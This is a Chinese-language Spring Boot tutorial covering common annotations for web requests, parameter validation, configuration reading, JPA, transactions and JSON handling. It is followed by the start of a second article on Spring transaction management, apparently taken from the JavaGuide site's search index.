：从服务器删除特定的资源。举个例子：DELETE /users/12（删除编号为 12 的学生） PATCH ：更新服务器上的资源（客户端提供更改的属性，可以看做作是部分更新），使用的比较少，这里就不举例子了。  3.1. GET 请求    @GetMapping(\u0026quot;users\u0026quot;) 等价于@RequestMapping(value=\u0026quot;/users\u0026quot;,method=RequestMethod.GET)\n@GetMapping(\u0026#34;/users\u0026#34;) public ResponseEntity\u0026lt;List\u0026lt;User\u0026gt;\u0026gt; getAllUsers() { return userRepository.findAll(); } 3.2. POST 请求    @PostMapping(\u0026quot;users\u0026quot;) 等价于@RequestMapping(value=\u0026quot;/users\u0026quot;,method=RequestMethod.POST)\n关于@RequestBody注解的使用，在下面的“前后端传值”这块会讲到。\n@PostMapping(\u0026#34;/users\u0026#34;) public ResponseEntity\u0026lt;User\u0026gt; createUser(@Valid @RequestBody UserCreateRequest userCreateRequest) { return userRespository.save(userCreateRequest); } 3.3. PUT 请求    @PutMapping(\u0026quot;/users/{userId}\u0026quot;) 等价于@RequestMapping(value=\u0026quot;/users/{userId}\u0026quot;,method=RequestMethod.PUT)\n@PutMapping(\u0026#34;/users/{userId}\u0026#34;) public ResponseEntity\u0026lt;User\u0026gt; updateUser(@PathVariable(value = \u0026#34;userId\u0026#34;) Long userId, @Valid @RequestBody UserUpdateRequest userUpdateRequest) { ...... } 3.4. DELETE 请求    @DeleteMapping(\u0026quot;/users/{userId}\u0026quot;)等价于@RequestMapping(value=\u0026quot;/users/{userId}\u0026quot;,method=RequestMethod.DELETE)\n@DeleteMapping(\u0026#34;/users/{userId}\u0026#34;) public ResponseEntity deleteUser(@PathVariable(value = \u0026#34;userId\u0026#34;) Long userId){ ...... } 3.5. PATCH 请求    一般实际项目中，我们都是 PUT 不够用了之后才用 PATCH 请求去更新数据。\n@PatchMapping(\u0026#34;/profile\u0026#34;) public ResponseEntity updateStudent(@RequestBody StudentUpdateRequest studentUpdateRequest) { studentRepository.updateDetail(studentUpdateRequest); return ResponseEntity.ok().build(); } 4. 前后端传值    掌握前后端传值的正确姿势，是你开始 CRUD 的第一步！\n4.1. @PathVariable 和 @RequestParam    @PathVariable用于获取路径参数，@RequestParam用于获取查询参数。\n举个简单的例子：\n@GetMapping(\u0026#34;/klasses/{klassId}/teachers\u0026#34;) public List\u0026lt;Teacher\u0026gt; getKlassRelatedTeachers( @PathVariable(\u0026#34;klassId\u0026#34;) Long klassId, @RequestParam(value = \u0026#34;type\u0026#34;, required = false) String type ) { ... } 如果我们请求的 url 是：/klasses/123456/teachers?type=web\n那么我们服务获取到的数据就是：klassId=123456,type=web。\n4.2. @RequestBody    用于读取 Request 请求（可能是 POST,PUT,DELETE,GET 请求）的 body 部分并且Content-Type 为 application/json 格式的数据，接收到数据之后会自动将数据绑定到 Java 对象上去。系统会使用HttpMessageConverter或者自定义的HttpMessageConverter将请求的 body 中的 json 字符串转换为 java 对象。\n我用一个简单的例子来给演示一下基本使用！\n我们有一个注册的接口：\n@PostMapping(\u0026#34;/sign-up\u0026#34;) public ResponseEntity signUp(@RequestBody @Valid UserRegisterRequest userRegisterRequest) { userService.save(userRegisterRequest); return ResponseEntity.ok().build(); } UserRegisterRequest对象：\n@Data @AllArgsConstructor @NoArgsConstructor public class UserRegisterRequest { @NotBlank private String userName; @NotBlank private String password; @NotBlank private String fullName; } 我们发送 post 请求到这个接口，并且 body 携带 JSON 数据：\n{\u0026#34;userName\u0026#34;:\u0026#34;coder\u0026#34;,\u0026#34;fullName\u0026#34;:\u0026#34;shuangkou\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;} 这样我们的后端就可以直接把 json 格式的数据映射到我们的 UserRegisterRequest 类上。\n👉 需要注意的是：一个请求方法只可以有一个@RequestBody，但是可以有多个@RequestParam和@PathVariable。 如果你的方法必须要用两个 @RequestBody来接受数据的话，大概率是你的数据库设计或者系统设计出问题了！\n5. 读取配置信息    很多时候我们需要将一些常用的配置信息比如阿里云 oss、发送短信、微信认证的相关配置信息等等放到配置文件中。\n下面我们来看一下 Spring 为我们提供了哪些方式帮助我们从配置文件中读取这些配置信息。\n我们的数据源application.yml内容如下：\nwuhan2020:2020年初武汉爆发了新型冠状病毒，疫情严重，但是，我相信一切都会过去！武汉加油！中国加油！my-profile:name:Guide哥email:koushuangbwcx@163.comlibrary:location:湖北武汉加油中国加油books:- name:天才基本法description:二十二岁的林朝夕在父亲确诊阿尔茨海默病这天，得知自己暗恋多年的校园男神裴之即将出国深造的消息——对方考取的学校，恰是父亲当年为她放弃的那所。- name:时间的秩序description:为什么我们记得过去，而非未来？时间“流逝”意味着什么？是我们存在于时间之内，还是时间存在于我们之中？卡洛·罗韦利用诗意的文字，邀请我们思考这一亘古难题——时间的本质。- name:了不起的我description:如何养成一个新习惯？如何让心智变得更成熟？如何拥有高质量的关系？ 如何走出人生的艰难时刻？5.1. @Value(常用)    使用 @Value(\u0026quot;${property}\u0026quot;) 读取比较简单的配置信息：\n@Value(\u0026#34;${wuhan2020}\u0026#34;) String wuhan2020; 5.2. @ConfigurationProperties(常用)    通过@ConfigurationProperties读取配置信息并与 bean 绑定。\n@Component @ConfigurationProperties(prefix = \u0026#34;library\u0026#34;) class LibraryProperties { @NotEmpty private String location; private List\u0026lt;Book\u0026gt; books; @Setter @Getter @ToString static class Book { String name; String description; } 省略getter/setter ...... } 你可以像使用普通的 Spring bean 一样，将其注入到类中使用。\n5.3. @PropertySource（不常用）    @PropertySource读取指定 properties 文件\n@Component @PropertySource(\u0026#34;classpath:website.properties\u0026#34;) class WebSite { @Value(\u0026#34;${url}\u0026#34;) private String url; 省略getter/setter ...... } 更多内容请查看我的这篇文章：《10 分钟搞定 SpringBoot 如何优雅读取配置文件？》 。\n6. 参数校验    数据的校验的重要性就不用说了，即使在前端对数据进行校验的情况下，我们还是要对传入后端的数据再进行一遍校验，避免用户绕过浏览器直接通过一些 HTTP 工具直接向后端请求一些违法数据。\nJSR(Java Specification Requests） 是一套 JavaBean 参数校验的标准，它定义了很多常用的校验注解，我们可以直接将这些注解加在我们 JavaBean 的属性上面，这样就可以在需要校验的时候进行校验了，非常方便！\n校验的时候我们实际用的是 Hibernate Validator 框架。Hibernate Validator 是 Hibernate 团队最初的数据校验框架，Hibernate Validator 4.x 是 Bean Validation 1.0（JSR 303）的参考实现，Hibernate Validator 5.x 是 Bean Validation 1.1（JSR 349）的参考实现，目前最新版的 Hibernate Validator 6.x 是 Bean Validation 2.0（JSR 380）的参考实现。\nSpringBoot 项目的 spring-boot-starter-web 依赖中已经有 hibernate-validator 包，不需要引用相关依赖。如下图所示（通过 idea 插件—Maven Helper 生成）：\n注：更新版本的 spring-boot-starter-web 依赖中不再有 hibernate-validator 包（如2.3.11.RELEASE），需要自己引入 spring-boot-starter-validation 依赖。\n非 SpringBoot 项目需要自行引入相关依赖包，这里不多做讲解，具体可以查看我的这篇文章：《如何在 Spring/Spring Boot 中做参数校验？你需要了解的都在这里！》。\n👉 需要注意的是： 所有的注解，推荐使用 JSR 注解，即javax.validation.constraints，而不是org.hibernate.validator.constraints\n6.1. 一些常用的字段验证的注解     @NotEmpty 被注释的字符串的不能为 null 也不能为空 @NotBlank 被注释的字符串非 null，并且必须包含一个非空白字符 @Null 被注释的元素必须为 null @NotNull 被注释的元素必须不为 null @AssertTrue 被注释的元素必须为 true @AssertFalse 被注释的元素必须为 false @Pattern(regex=,flag=)被注释的元素必须符合指定的正则表达式 @Email 被注释的元素必须是 Email 格式。 @Min(value)被注释的元素必须是一个数字，其值必须大于等于指定的最小值 @Max(value)被注释的元素必须是一个数字，其值必须小于等于指定的最大值 @DecimalMin(value)被注释的元素必须是一个数字，其值必须大于等于指定的最小值 @DecimalMax(value) 被注释的元素必须是一个数字，其值必须小于等于指定的最大值 @Size(max=, min=)被注释的元素的大小必须在指定的范围内 @Digits(integer, fraction)被注释的元素必须是一个数字，其值必须在可接受的范围内 @Past被注释的元素必须是一个过去的日期 @Future 被注释的元素必须是一个将来的日期 \u0026hellip;\u0026hellip;  6.2. 验证请求体(RequestBody)    @Data @AllArgsConstructor @NoArgsConstructor public class Person { @NotNull(message = \u0026#34;classId 不能为空\u0026#34;) private String classId; @Size(max = 33) @NotNull(message = \u0026#34;name 不能为空\u0026#34;) private String name; @Pattern(regexp = \u0026#34;((^Man$|^Woman$|^UGM$))\u0026#34;, message = \u0026#34;sex 值不在可选范围\u0026#34;) @NotNull(message = \u0026#34;sex 不能为空\u0026#34;) private String sex; @Email(message = \u0026#34;email 格式不正确\u0026#34;) @NotNull(message = \u0026#34;email 不能为空\u0026#34;) private String email; } 我们在需要验证的参数上加上了@Valid注解，如果验证失败，它将抛出MethodArgumentNotValidException。\n@RestController @RequestMapping(\u0026#34;/api\u0026#34;) public class PersonController { @PostMapping(\u0026#34;/person\u0026#34;) public ResponseEntity\u0026lt;Person\u0026gt; getPerson(@RequestBody @Valid Person person) { return ResponseEntity.ok().body(person); } } 6.3. 验证请求参数(Path Variables 和 Request Parameters)    一定一定不要忘记在类上加上 @Validated 注解了，这个参数可以告诉 Spring 去校验方法参数。\n@RestController @RequestMapping(\u0026#34;/api\u0026#34;) @Validated public class PersonController { @GetMapping(\u0026#34;/person/{id}\u0026#34;) public ResponseEntity\u0026lt;Integer\u0026gt; getPersonByID(@Valid @PathVariable(\u0026#34;id\u0026#34;) @Max(value = 5,message = \u0026#34;超过 id 的范围了\u0026#34;) Integer id) { return ResponseEntity.ok().body(id); } } 更多关于如何在 Spring 项目中进行参数校验的内容，请看《如何在 Spring/Spring Boot 中做参数校验？你需要了解的都在这里！》这篇文章。\n7. 全局处理 Controller 层异常    介绍一下我们 Spring 项目必备的全局处理 Controller 层异常。\n相关注解：\n @ControllerAdvice :注解定义全局异常处理类 @ExceptionHandler :注解声明异常处理方法  如何使用呢？拿我们在第 5 节参数校验这块来举例子。如果方法参数不对的话就会抛出MethodArgumentNotValidException，我们来处理这个异常。\n@ControllerAdvice @ResponseBody public class GlobalExceptionHandler { /** * 请求参数异常处理 */ @ExceptionHandler(MethodArgumentNotValidException.class) public ResponseEntity\u0026lt;?\u0026gt; handleMethodArgumentNotValidException(MethodArgumentNotValidException ex, HttpServletRequest request) { ...... } } 更多关于 Spring Boot 异常处理的内容，请看我的这两篇文章：\n SpringBoot 处理异常的几种常见姿势 使用枚举简单封装一个优雅的 Spring Boot 全局异常处理！  8. JPA 相关    8.1. 创建表    @Entity声明一个类对应一个数据库实体。\n@Table 设置表名\n@Entity @Table(name = \u0026#34;role\u0026#34;) public class Role { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; private String name; private String description; 省略getter/setter...... } 8.2. 创建主键    @Id ：声明一个字段为主键。\n使用@Id声明之后，我们还需要定义主键的生成策略。我们可以使用 @GeneratedValue 指定主键生成策略。\n1.通过 @GeneratedValue直接使用 JPA 内置提供的四种主键生成策略来指定主键生成策略。\n@Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; JPA 使用枚举定义了 4 种常见的主键生成策略，如下：\nGuide 哥：枚举替代常量的一种用法\npublic enum GenerationType { /** * 使用一个特定的数据库表格来保存主键 * 持久化引擎通过关系数据库的一张特定的表格来生成主键, */ TABLE, /** *在某些数据库中,不支持主键自增长,比如Oracle、PostgreSQL其提供了一种叫做\u0026#34;序列(sequence)\u0026#34;的机制生成主键 */ SEQUENCE, /** * 主键自增长 */ IDENTITY, /** *把主键生成策略交给持久化引擎(persistence engine), *持久化引擎会根据数据库在以上三种主键生成 策略中选择其中一种 */ AUTO } @GeneratedValue注解默认使用的策略是GenerationType.AUTO\npublic @interface GeneratedValue { GenerationType strategy() default AUTO; String generator() default \u0026#34;\u0026#34;; } 一般使用 MySQL 数据库的话，使用GenerationType.IDENTITY策略比较普遍一点（分布式系统的话需要另外考虑使用分布式 ID）。\n2.通过 @GenericGenerator声明一个主键策略，然后 @GeneratedValue使用这个策略\n@Id @GeneratedValue(generator = \u0026#34;IdentityIdGenerator\u0026#34;) @GenericGenerator(name = \u0026#34;IdentityIdGenerator\u0026#34;, strategy = \u0026#34;identity\u0026#34;) private Long id; 等价于：\n@Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; jpa 提供的主键生成策略有如下几种：\npublic class DefaultIdentifierGeneratorFactory implements MutableIdentifierGeneratorFactory, Serializable, ServiceRegistryAwareService { @SuppressWarnings(\u0026#34;deprecation\u0026#34;) public DefaultIdentifierGeneratorFactory() { register( \u0026#34;uuid2\u0026#34;, UUIDGenerator.class ); register( \u0026#34;guid\u0026#34;, GUIDGenerator.class );\t// can be done with UUIDGenerator + strategy \tregister( \u0026#34;uuid\u0026#34;, UUIDHexGenerator.class );\t// \u0026#34;deprecated\u0026#34; for new use \tregister( \u0026#34;uuid.hex\u0026#34;, UUIDHexGenerator.class ); // uuid.hex is deprecated \tregister( \u0026#34;assigned\u0026#34;, Assigned.class ); register( \u0026#34;identity\u0026#34;, IdentityGenerator.class ); register( \u0026#34;select\u0026#34;, SelectGenerator.class ); register( \u0026#34;sequence\u0026#34;, SequenceStyleGenerator.class ); register( \u0026#34;seqhilo\u0026#34;, SequenceHiLoGenerator.class ); register( \u0026#34;increment\u0026#34;, IncrementGenerator.class ); register( \u0026#34;foreign\u0026#34;, ForeignGenerator.class ); register( \u0026#34;sequence-identity\u0026#34;, SequenceIdentityGenerator.class ); register( \u0026#34;enhanced-sequence\u0026#34;, SequenceStyleGenerator.class ); register( \u0026#34;enhanced-table\u0026#34;, TableGenerator.class ); } public void register(String strategy, Class generatorClass) { LOG.debugf( \u0026#34;Registering IdentifierGenerator strategy [%s] -\u0026gt; [%s]\u0026#34;, strategy, generatorClass.getName() ); final Class previous = generatorStrategyToClassNameMap.put( strategy, generatorClass ); if ( previous != null ) { LOG.debugf( \u0026#34; - overriding [%s]\u0026#34;, previous.getName() ); } } } 8.3. 设置字段类型    @Column 声明字段。\n示例：\n设置属性 userName 对应的数据库字段名为 user_name，长度为 32，非空\n@Column(name = \u0026#34;user_name\u0026#34;, nullable = false, length=32) private String userName; 设置字段类型并且加默认值，这个还是挺常用的。\n@Column(columnDefinition = \u0026#34;tinyint(1) default 1\u0026#34;) private Boolean enabled; 8.4. 指定不持久化特定字段    @Transient ：声明不需要与数据库映射的字段，在保存的时候不需要保存进数据库 。\n如果我们想让secrect 这个字段不被持久化，可以使用 @Transient关键字声明。\n@Entity(name=\u0026#34;USER\u0026#34;) public class User { ...... @Transient private String secrect; // not persistent because of @Transient  } 除了 @Transient关键字声明， 还可以采用下面几种方法：\nstatic String secrect; // not persistent because of static final String secrect = \u0026#34;Satish\u0026#34;; // not persistent because of final transient String secrect; // not persistent because of transient 一般使用注解的方式比较多。\n8.5. 声明大字段    @Lob:声明某个字段为大字段。\n@Lob private String content; 更详细的声明：\n@Lob //指定 Lob 类型数据的获取策略， FetchType.EAGER 表示非延迟加载，而 FetchType.LAZY 表示延迟加载 ； @Basic(fetch = FetchType.EAGER) //columnDefinition 属性指定数据表对应的 Lob 字段类型 @Column(name = \u0026#34;content\u0026#34;, columnDefinition = \u0026#34;LONGTEXT NOT NULL\u0026#34;) private String content; 8.6. 创建枚举类型的字段    可以使用枚举类型的字段，不过枚举字段要用@Enumerated注解修饰。\npublic enum Gender { MALE(\u0026#34;男性\u0026#34;), FEMALE(\u0026#34;女性\u0026#34;); private String value; Gender(String str){ value=str; } } @Entity @Table(name = \u0026#34;role\u0026#34;) public class Role { @Id @GeneratedValue(strategy = GenerationType.IDENTITY) private Long id; private String name; private String description; @Enumerated(EnumType.STRING) private Gender gender; 省略getter/setter...... } 数据库里面对应存储的是 MALE/FEMALE。\n8.7. 增加审计功能    只要继承了 AbstractAuditBase的类都会默认加上下面四个字段。\n@Data @AllArgsConstructor @NoArgsConstructor @MappedSuperclass @EntityListeners(value = AuditingEntityListener.class) public abstract class AbstractAuditBase { @CreatedDate @Column(updatable = false) @JsonIgnore private Instant createdAt; @LastModifiedDate @JsonIgnore private Instant updatedAt; @CreatedBy @Column(updatable = false) @JsonIgnore private String createdBy; @LastModifiedBy @JsonIgnore private String updatedBy; } 我们对应的审计功能对应地配置类可能是下面这样的（Spring Security 项目）:\n@Configuration @EnableJpaAuditing public class AuditSecurityConfiguration { @Bean AuditorAware\u0026lt;String\u0026gt; auditorAware() { return () -\u0026gt; Optional.ofNullable(SecurityContextHolder.getContext()) .map(SecurityContext::getAuthentication) .filter(Authentication::isAuthenticated) .map(Authentication::getName); } } 简单介绍一下上面涉及到的一些注解：\n  @CreatedDate: 表示该字段为创建时间字段，在这个实体被 insert 的时候，会设置值\n  @CreatedBy :表示该字段为创建人，在这个实体被 insert 的时候，会设置值\n@LastModifiedDate、@LastModifiedBy同理。\n  @EnableJpaAuditing：开启 JPA 审计功能。\n8.8. 删除/修改数据    @Modifying 注解提示 JPA 该操作是修改操作,注意还要配合@Transactional注解使用。\n@Repository public interface UserRepository extends JpaRepository\u0026lt;User, Integer\u0026gt; { @Modifying @Transactional(rollbackFor = Exception.class) void deleteByUserName(String userName); } 8.9. 关联关系     @OneToOne 声明一对一关系 @OneToMany 声明一对多关系 @ManyToOne 声明多对一关系 @MangToMang 声明多对多关系  更多关于 Spring Boot JPA 的文章请看我的这篇文章：一文搞懂如何在 Spring Boot 正确中使用 JPA 。\n9. 事务 @Transactional    在要开启事务的方法上使用@Transactional注解即可!\n@Transactional(rollbackFor = Exception.class) public void save() { ...... } 我们知道 Exception 分为运行时异常 RuntimeException 和非运行时异常。在@Transactional注解中如果不配置rollbackFor属性,那么事务只会在遇到RuntimeException的时候才会回滚,加上rollbackFor=Exception.class,可以让事务在遇到非运行时异常时也回滚。\n@Transactional 注解一般可以作用在类或者方法上。\n 作用于类：当把@Transactional 注解放在类上时，表示所有该类的 public 方法都配置相同的事务属性信息。 作用于方法：当类配置了@Transactional，方法也配置了@Transactional，方法的事务会覆盖类的事务配置信息。  更多关于 Spring 事务的内容请查看：\n 可能是最漂亮的 Spring 事务管理详解 一口气说出 6 种 @Transactional 注解失效场景  10. json 数据处理    10.1. 过滤 json 数据    @JsonIgnoreProperties 作用在类上用于过滤掉特定字段不返回或者不解析。\n//生成json时将userRoles属性过滤 @JsonIgnoreProperties({\u0026#34;userRoles\u0026#34;}) public class User { private String userName; private String fullName; private String password; private List\u0026lt;UserRole\u0026gt; userRoles = new ArrayList\u0026lt;\u0026gt;(); } @JsonIgnore一般用于类的属性上，作用和上面的@JsonIgnoreProperties 一样。\npublic class User { private String userName; private String fullName; private String password; //生成json时将userRoles属性过滤  @JsonIgnore private List\u0026lt;UserRole\u0026gt; userRoles = new ArrayList\u0026lt;\u0026gt;(); } 10.2. 格式化 json 数据    @JsonFormat一般用来格式化 json 数据。\n比如：\n@JsonFormat(shape=JsonFormat.Shape.STRING, pattern=\u0026#34;yyyy-MM-dd\u0026#39;T\u0026#39;HH:mm:ss.SSS\u0026#39;Z\u0026#39;\u0026#34;, timezone=\u0026#34;GMT\u0026#34;) private Date date; 10.3. 扁平化对象    @Getter @Setter @ToString public class Account { private Location location; private PersonInfo personInfo; @Getter @Setter @ToString public static class Location { private String provinceName; private String countyName; } @Getter @Setter @ToString public static class PersonInfo { private String userName; private String fullName; } } 未扁平化之前：\n{ \u0026#34;location\u0026#34;: { \u0026#34;provinceName\u0026#34;:\u0026#34;湖北\u0026#34;, \u0026#34;countyName\u0026#34;:\u0026#34;武汉\u0026#34; }, \u0026#34;personInfo\u0026#34;: { \u0026#34;userName\u0026#34;: \u0026#34;coder1234\u0026#34;, \u0026#34;fullName\u0026#34;: \u0026#34;shaungkou\u0026#34; } } 使用@JsonUnwrapped 扁平对象之后：\n@Getter @Setter @ToString public class Account { @JsonUnwrapped private Location location; @JsonUnwrapped private PersonInfo personInfo; ...... } { \u0026#34;provinceName\u0026#34;:\u0026#34;湖北\u0026#34;, \u0026#34;countyName\u0026#34;:\u0026#34;武汉\u0026#34;, \u0026#34;userName\u0026#34;: \u0026#34;coder1234\u0026#34;, \u0026#34;fullName\u0026#34;: \u0026#34;shaungkou\u0026#34; } 11. 测试相关    @ActiveProfiles一般作用于测试类上， 用于声明生效的 Spring 配置文件。\n@SpringBootTest(webEnvironment = RANDOM_PORT) @ActiveProfiles(\u0026#34;test\u0026#34;) @Slf4j public abstract class TestBase { ...... } @Test声明一个方法为测试方法\n@Transactional被声明的测试方法的数据会回滚，避免污染测试数据。\n@WithMockUser Spring Security 提供的，用来模拟一个真实用户，并且可以赋予权限。\n@Test @Transactional @WithMockUser(username = \u0026#34;user-id-18163138155\u0026#34;, authorities = \u0026#34;ROLE_TEACHER\u0026#34;) void should_import_student_success() throws Exception { ...... } 暂时总结到这里吧！虽然花了挺长时间才写完，不过可能还是会一些常用的注解的被漏掉，所以，我将文章也同步到了 Github 上去，Github 地址： 欢迎完善！\n本文已经收录进我的 75K Star 的 Java 开源项目 JavaGuide：https://github.com/Snailclimb/JavaGuide。\n"},{"id":305,"href":"/system-design/framework/spring/Spring%E4%BA%8B%E5%8A%A1%E6%80%BB%E7%BB%93/","title":"Spring事务总结","parent":"spring","content":"大家好，我是 Guide 哥，前段时间答应读者的 Spring 事务分析总结终于来了。这部分内容比较重要，不论是对于工作还是面试，但是网上比较好的参考资料比较少。\n如果本文有任何不对或者需要完善的地方，请帮忙指出！Guide 哥感激不尽！\n1. 什么是事务？    事务是逻辑上的一组操作，要么都执行，要么都不执行。\nGuide 哥：大家应该都能背上面这句话了，下面我结合我们日常的真实开发来谈一谈。\n我们系统的每个业务方法可能包括了多个原子性的数据库操作，比如下面的 savePerson() 方法中就有两个原子性的数据库操作。这些原子性的数据库操作是有依赖的，它们要么都执行，要不就都不执行。\npublic void savePerson() { personDao.save(person); personDetailDao.save(personDetail); } 另外，需要格外注意的是：事务能否生效数据库引擎是否支持事务是关键。比如常用的 MySQL 数据库默认使用支持事务的innodb引擎。但是，如果把数据库引擎变为 myisam，那么程序也就不再支持事务了！\n事务最经典也经常被拿出来说例子就是转账了。假如小明要给小红转账 1000 元，这个转账会涉及到两个关键操作就是：\n  将小明的余额减少 1000 元\n  将小红的余额增加 1000 元。\n  万一在这两个操作之间突然出现错误比如银行系统崩溃或者网络故障，导致小明余额减少而小红的余额没有增加，这样就不对了。事务就是保证这两个关键操作要么都成功，要么都要失败。\npublic class OrdersService { private AccountDao accountDao; public void setOrdersDao(AccountDao accountDao) { this.accountDao = accountDao; } @Transactional(propagation = Propagation.REQUIRED, isolation = Isolation.DEFAULT, readOnly = false, timeout = -1) public void accountMoney() { //小红账户多1000 \taccountDao.addMoney(1000,xiaohong); //模拟突然出现的异常，比如银行中可能为突然停电等等  //如果没有配置事务管理的话会造成，小红账户多了1000而小明账户没有少钱 \tint i = 10 / 0; //小王账户少1000 \taccountDao.reduceMoney(1000,xiaoming); } } 另外，数据库事务的 ACID 四大特性是事务的基础，下面简单来了解一下。\n2. 事务的特性（ACID）了解么?     原子性（Atomicity）： 一个事务（transaction）中的所有操作，或者全部完成，或者全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。即，事务不可分割、不可约简。 一致性（Consistency）： 在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设约束、触发器、级联回滚等。 隔离性（Isolation）： 数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括未提交读（Read uncommitted）、提交读（read committed）、可重复读（repeatable read）和串行化（Serializable）。 持久性（Durability）: 事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。  参考 ：https://zh.wikipedia.org/wiki/ACID 。\n3. 详谈 Spring 对事务的支持    再提醒一次：你的程序是否支持事务首先取决于数据库 ，比如使用 MySQL 的话，如果你选择的是 innodb 引擎，那么恭喜你，是可以支持事务的。但是，如果你的 MySQL 数据库使用的是 myisam 引擎的话，那不好意思，从根上就是不支持事务的。\n这里再多提一下一个非常重要的知识点： MySQL 怎么保证原子性的？\n我们知道如果想要保证事务的原子性，就需要在异常发生时，对已经执行的操作进行回滚，在 MySQL 中，恢复机制是通过 回滚日志（undo log） 实现的，所有事务进行的修改都会先先记录到这个回滚日志中，然后再执行相关的操作。如果执行过程中遇到异常的话，我们直接利用 回滚日志 中的信息将数据回滚到修改之前的样子即可！并且，回滚日志会先于数据持久化到磁盘上。这样就保证了即使遇到数据库突然宕机等情况，当用户再次启动数据库的时候，数据库还能够通过查询回滚日志来回滚将之前未完成的事务。\n3.1. Spring 支持两种方式的事务管理    1).编程式事务管理    通过 TransactionTemplate或者TransactionManager手动管理事务，实际应用中很少使用，但是对于你理解 Spring 事务管理原理有帮助。\n使用TransactionTemplate 进行编程式事务管理的示例代码如下：\n@Autowired private TransactionTemplate transactionTemplate; public void testTransaction() { transactionTemplate.execute(new TransactionCallbackWithoutResult() { @Override protected void doInTransactionWithoutResult(TransactionStatus transactionStatus) { try { // .... 业务代码  } catch (Exception e){ //回滚  transactionStatus.setRollbackOnly(); } } }); } 使用 TransactionManager 进行编程式事务管理的示例代码如下：\n@Autowired private PlatformTransactionManager transactionManager; public void testTransaction() { TransactionStatus status = transactionManager.getTransaction(new DefaultTransactionDefinition()); try { // .... 业务代码  transactionManager.commit(status); } catch (Exception e) { transactionManager.rollback(status); } } 2)声明式事务管理    推荐使用（代码侵入性最小），实际是通过 AOP 实现（基于@Transactional 的全注解方式使用最多）。\n使用 @Transactional注解进行事务管理的示例代码如下：\n@Transactional(propagation=propagation.PROPAGATION_REQUIRED) public void aMethod { //do something  B b = new B(); C c = new C(); b.bMethod(); c.cMethod(); } 3.2. Spring 事务管理接口介绍    Spring 框架中，事务管理相关最重要的 3 个接口如下：\n PlatformTransactionManager： （平台）事务管理器，Spring 事务策略的核心。 TransactionDefinition： 事务定义信息(事务隔离级别、传播行为、超时、只读、回滚规则)。 TransactionStatus： 事务运行状态。  我们可以把 PlatformTransactionManager 接口可以被看作是事务上层的管理者，而 TransactionDefinition 和 TransactionStatus 这两个接口可以看作是事务的描述。\nPlatformTransactionManager 会根据 TransactionDefinition 的定义比如事务超时时间、隔离级别、传播行为等来进行事务管理 ，而 TransactionStatus 接口则提供了一些方法来获取事务相应的状态比如是否新事务、是否可以回滚等等。\n3.2.1. PlatformTransactionManager:事务管理接口    Spring 并不直接管理事务，而是提供了多种事务管理器 。Spring 事务管理器的接口是： PlatformTransactionManager 。\n通过这个接口，Spring 为各个平台如 JDBC(DataSourceTransactionManager)、Hibernate(HibernateTransactionManager)、JPA(JpaTransactionManager)等都提供了对应的事务管理器，但是具体的实现就是各个平台自己的事情了。\nPlatformTransactionManager 接口的具体实现如下:\nPlatformTransactionManager接口中定义了三个方法：\npackage org.springframework.transaction; import org.springframework.lang.Nullable; public interface PlatformTransactionManager { //获得事务  TransactionStatus getTransaction(@Nullable TransactionDefinition var1) throws TransactionException; //提交事务  void commit(TransactionStatus var1) throws TransactionException; //回滚事务  void rollback(TransactionStatus var1) throws TransactionException; } 这里多插一嘴。为什么要定义或者说抽象出来PlatformTransactionManager这个接口呢？\n主要是因为要将事务管理行为抽象出来，然后不同的平台去实现它，这样我们可以保证提供给外部的行为不变，方便我们扩展。我前段时间分享过：“为什么我们要用接口？”\n3.2.2. TransactionDefinition:事务属性    事务管理器接口 PlatformTransactionManager 通过 getTransaction(TransactionDefinition definition) 方法来得到一个事务，这个方法里面的参数是 TransactionDefinition 类 ，这个类就定义了一些基本的事务属性。\n那么什么是 事务属性 呢？\n事务属性可以理解成事务的一些基本配置，描述了事务策略如何应用到方法上。\n事务属性包含了 5 个方面：\nTransactionDefinition 接口中定义了 5 个方法以及一些表示事务属性的常量比如隔离级别、传播行为等等。\npackage org.springframework.transaction; import org.springframework.lang.Nullable; public interface TransactionDefinition { int PROPAGATION_REQUIRED = 0; int PROPAGATION_SUPPORTS = 1; int PROPAGATION_MANDATORY = 2; int PROPAGATION_REQUIRES_NEW = 3; int PROPAGATION_NOT_SUPPORTED = 4; int PROPAGATION_NEVER = 5; int PROPAGATION_NESTED = 6; int ISOLATION_DEFAULT = -1; int ISOLATION_READ_UNCOMMITTED = 1; int ISOLATION_READ_COMMITTED = 2; int ISOLATION_REPEATABLE_READ = 4; int ISOLATION_SERIALIZABLE = 8; int TIMEOUT_DEFAULT = -1; // 返回事务的传播行为，默认值为 REQUIRED。  int getPropagationBehavior(); //返回事务的隔离级别，默认值是 DEFAULT  int getIsolationLevel(); // 返回事务的超时时间，默认值为-1。如果超过该时间限制但事务还没有完成，则自动回滚事务。  int getTimeout(); // 返回是否为只读事务，默认值为 false  boolean isReadOnly(); @Nullable String getName(); } 3.2.3. TransactionStatus:事务状态    TransactionStatus接口用来记录事务的状态 该接口定义了一组方法,用来获取或判断事务的相应状态信息。\nPlatformTransactionManager.getTransaction(…)方法返回一个 TransactionStatus 对象。\nTransactionStatus 接口接口内容如下：\npublic interface TransactionStatus{ boolean isNewTransaction(); // 是否是新的事务  boolean hasSavepoint(); // 是否有恢复点  void setRollbackOnly(); // 设置为只回滚  boolean isRollbackOnly(); // 是否为只回滚  boolean isCompleted; // 是否已完成 } 3.3. 事务属性详解    实际业务开发中，大家一般都是使用 @Transactional 注解来开启事务，很多人并不清楚这个参数里面的参数是什么意思，有什么用。为了更好的在项目中使用事务管理，强烈推荐好好阅读一下下面的内容。\n3.3.1. 事务传播行为    事务传播行为是为了解决业务层方法之间互相调用的事务问题。\n当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能继续在现有事务中运行，也可能开启一个新事务，并在自己的事务中运行。\n举个例子！\n我们在 A 类的aMethod（）方法中调用了 B 类的 bMethod() 方法。这个时候就涉及到业务层方法之间互相调用的事务问题。如果我们的 